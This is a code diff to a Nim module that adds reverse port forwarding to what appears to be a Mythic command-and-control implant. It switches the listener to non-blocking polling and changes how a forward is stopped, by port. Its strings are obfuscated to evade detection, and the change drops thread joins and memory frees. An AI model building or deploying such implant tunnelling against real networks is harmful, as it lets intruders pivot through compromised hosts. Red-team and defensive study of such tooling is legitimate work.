@@ -62,7 +62,7 @@ type
     sharedPtr: ptr RpfwdListenerObj  # Stable pointer for thread
 
 var
-  activeRpfwdListeners {.threadvar.}: Table[string, RpfwdListener]
+  activeRpfwdListeners: Table[string, RpfwdListener]
   rpfwdActive* = false
 
 proc createRpfwdMessage*(serverId: uint32, exit: bool, port: int, data: string = ""): JsonNode =
@@ -153,9 +153,12 @@ proc writeToDestination(conn: ptr RpfwdConnectionObj) {.thread.} =
 
 proc acceptConnections(listener: ptr RpfwdListenerObj) {.thread.} =
   ## Thread that accepts incoming connections and creates connection handlers
+  # Set listener socket to non-blocking mode for periodic active checks
+  listener[].listenerSocket.getFd().setBlocking(false)
+  
   while listener[].active:
     try:
-      # Accept incoming connection (blocking call)
+      # Try to accept (non-blocking)
       var clientSocket: Socket
       listener[].listenerSocket.accept(clientSocket)
       
@@ -206,35 +209,50 @@ proc acceptConnections(listener: ptr RpfwdListenerObj) {.thread.} =
       listener[].connections[serverId] = conn
       
       # Connection accepted - main loop will detect new connection via checkActiveRpfwdConnections
-      
+    except OSError:
+      # No pending connections (EWOULDBLOCK/EAGAIN on non-blocking socket)
+      # Sleep briefly and check active flag on next iteration
+      sleep(100)  # 100ms
     except:
-      # Accept error - listener might be closing
+      # Other error
       if listener[].active:
         # Unexpected error, sleep briefly before retry
         sleep(100)
+      else:
+        # Listener is shutting down, exit thread
+        break
 
 proc rpfwd*(taskId: string, params: JsonNode): JsonNode =
   ## Start/stop reverse port forward
   let action = params{obf("action")}.getStr(obf("start"))
   
   if action == obf("stop"):
-    # Stop existing listener
-    if activeRpfwdListeners.hasKey(taskId):
-      let listener = activeRpfwdListeners[taskId]
-      listener.active = false
-      listener.sharedPtr[].active = false
+    # Stop existing listener - find by port since each command has a different taskId
+    let port = params[obf("port")].getInt()
+    var foundListener: RpfwdListener = nil
+    var foundTaskId: string = ""
+    
+    for tid, listener in activeRpfwdListeners:
+      if listener.port == port:
+        foundListener = listener
+        foundTaskId = tid
+        break
+    
+    if foundListener != nil:
+      foundListener.active = false
+      foundListener.sharedPtr[].active = false
       
-      # Close listener socket (will break accept thread)
+      # Close listener socket first - this will cause accept() to fail immediately
       try:
-        listener.listenerSocket.close()
+        foundListener.listenerSocket.close()
       except:
         discard
       
-      # Wait for accept thread
-      joinThread(listener.acceptThread)
+      # Give accept thread time to detect failure and exit (checks every ~100ms)
+      sleep(250)
       
       # Close all connections
-      for serverId, conn in listener.connections:
+      for serverId, conn in foundListener.connections:
         conn.active = false
         conn.sharedPtr[].active = false
         try:
@@ -242,26 +260,28 @@ proc rpfwd*(taskId: string, params: JsonNode): JsonNode =
         except:
           discard
         
-        # Wait for threads
-        joinThread(conn.readerThread)
-        joinThread(conn.writerThread)
+        # Close channels to signal threads to exit
+        try:
+          conn.inChannel[].close()
+        except:
+          discard
+        try:
+          conn.outChannel[].close()
+        except:
+          discard
         
-        # Clean up channels and memory
-        conn.inChannel[].close()
-        conn.outChannel[].close()
-        dealloc(conn.inChannel)
-        dealloc(conn.outChannel)
-        dealloc(conn.sharedPtr)
+        # Don't wait for threads - they will exit when socket/channels are closed
+        # Memory cleanup will happen naturally when threads exit
       
       # Clean up listener
-      dealloc(listener.sharedPtr)
-      activeRpfwdListeners.del(taskId)
+      # Note: Thread resources will be cleaned up when thread exits
+      activeRpfwdListeners.del(foundTaskId)
       rpfwdActive = activeRpfwdListeners.len > 0
       
       return mythicSuccess(taskId, obf("Reverse port forward stopped successfully") &
-        fmt" on port {listener.port}")
+        fmt" on port {foundListener.port}")
     else:
-      return mythicError(taskId, obf("No active reverse port forward for this task"))
+      return mythicError(taskId, obf("No active reverse port forward found on port ") & $port)
   
   # Start new listener
   let port = params[obf("port")].getInt()
@@ -271,7 +291,6 @@ proc rpfwd*(taskId: string, params: JsonNode): JsonNode =
   # Create listener socket
   var listenerSocket = newSocket()
   listenerSocket.setSockOpt(OptReuseAddr, true)
-  listenerSocket.getFd().setBlocking(true)  # Accept thread uses blocking accept
   
   try:
     listenerSocket.bindAddr(Port(port), obf("0.0.0.0"))
